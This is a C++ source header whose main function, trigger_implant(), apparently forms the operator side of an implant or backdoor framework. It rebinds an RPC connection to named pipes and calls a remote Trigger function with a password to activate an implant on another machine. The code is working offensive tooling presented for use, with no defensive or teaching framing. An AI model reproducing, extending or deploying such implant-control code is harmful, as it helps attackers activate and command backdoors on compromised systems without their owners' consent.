#pragma once
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers


#include "../RPCLibInterface/RPCLibInterface.h"
#include <Windows.h>
#include <cstdlib>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")

/*!
* Triggers a remote implant over RPC
*
*
*  @param ptrTriggerContext A pointer to the trigger context instance
*  @param szPass A password to compare when triggering remotely
*
*  @return ERROR_SUCCESS upon success.
*          ERROR_FUNCTION_FAILED or RPC_STATUS error code upon failure.
*/
int trigger_implant(_TRIGGER_CONTEXT ptrTriggerContext, unsigned char szPass[]) {

	// return value
	RPC_STATUS dwRpcStatus = ERROR_FUNCTION_FAILED;


	// string used to store the original binding info
	RPC_WSTR szOriginalStringBinding = nullptr;

	// variables used to store components of the original interface binding
	RPC_WSTR szProtocolSequence = nullptr;
	RPC_WSTR szNetworkAddress = nullptr;
	RPC_WSTR szEndpoint = nullptr;
	RPC_WSTR szNetworkOptions = nullptr;

	// string used to store the modified string binding
	RPC_WSTR szStringBinding = nullptr;

	// Turn original binding info into a string
	RpcBindingToStringBinding(hBinding, &szOriginalStringBinding);

	// Break the original binding info into components
	RpcStringBindingParse(
		szOriginalStringBinding,
		nullptr,
		&szProtocolSequence,
		&szNetworkAddress,
		&szEndpoint,
		&szNetworkOptions);

	// modify the binding info to use named pipes
	RpcStringBindingCompose(
		nullptr,
		RPC_WSTR(L"ncacn_np"), // Use named pipe
		szNetworkAddress, 
		szEndpoint, 
		szNetworkOptions,
		&szStringBinding); 

	// Create a new binding string
	dwRpcStatus = RpcBindingFromStringBinding(
		szStringBinding, // The string binding to validate.
		&hBinding); // Put the result in the implicit binding
	if (dwRpcStatus)
		return(dwRpcStatus);

	// Try to parse the new string binding (validity check)
	dwRpcStatus = RpcEpResolveBinding(
		hBinding,
		RPCLib_v1_0_c_ifspec
	);

	if (dwRpcStatus)
		return(dwRpcStatus);

	RpcTryExcept
	{
		// Calls the RPC function. The hBinding binding handle
		// is used implicitly.
		// Connection is done here.
		Trigger(&szPass[0], &ptrTriggerContext);
	}
		RpcExcept(1)
	{
		std::cerr << "Runtime reported exception " << RpcExceptionCode()
			<< std::endl;
	}
	RpcEndExcept

	// Releases binding handle resources and disconnects from the server.
	dwRpcStatus = RpcBindingFree(
		&hBinding); // Frees the implicit binding handle defined in
					// the IDL file.
	if (dwRpcStatus)
		return(dwRpcStatus);

	return 0;
}

/*!
* (Override) Memory allocation function for RPC.
* The runtime uses these two functions for allocating/deallocating
* enough memory
*/
void* __RPC_USER midl_user_allocate(size_t size)
{
	return malloc(size);
}

/*!
* (Override) Memory deallocation function for RPC.
* The runtime uses these two functions for allocating/deallocating
* enough memory
*/
void __RPC_USER midl_user_free(void* p)
{
	free(p);
}
